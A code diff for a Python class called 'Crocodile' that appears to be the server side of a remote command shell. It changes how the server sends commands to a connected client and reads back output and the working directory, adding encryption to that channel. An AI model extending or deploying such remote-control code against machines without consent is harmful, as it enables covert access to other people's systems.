@@ -107,18 +107,22 @@ class Crocodile:
                     current_dir = decrypted_resp.decode()
                     continue
                 else:
-                    res= command.encode('utf-8')
-                    writer.write(res)
-                    resp = await reader.read(1024)
-                    current_dir = resp
-                    writer.write(b"pwd")
+                    commandSend = self.encryptor.encrypt(command)
+                    writer.write(commandSend)
+                    res_read = await reader.read(1024)
+                    res_print = self.encryptor.decrypt(res_read)
+                    print(res_print.decode())
+                    pwd = "pwd"
+                    Encript = self.encryptor.encrypt(pwd)
+                    writer.write(Encript)
                     resp2 = await reader.read(1024)
-                    current_dir = resp2.decode()
-                if not resp and resp == "":
-                    print("🔴 El cliente cerró la conexión.")
-                    break
+                    current_dir2 = self.encryptor.decrypt(resp2)
+                    current_dir = current_dir2
+                # if not resp and resp == "":
+                #     print("🔴 El cliente cerró la conexión.")
+                #     break
                     
-                print(resp.decode())
+                # print(resp.decode())
             except Exception as e:
                 print("ocurrio un error", e)
                 if( str(e).find("El nombre de red especificado ya no está disponible")):
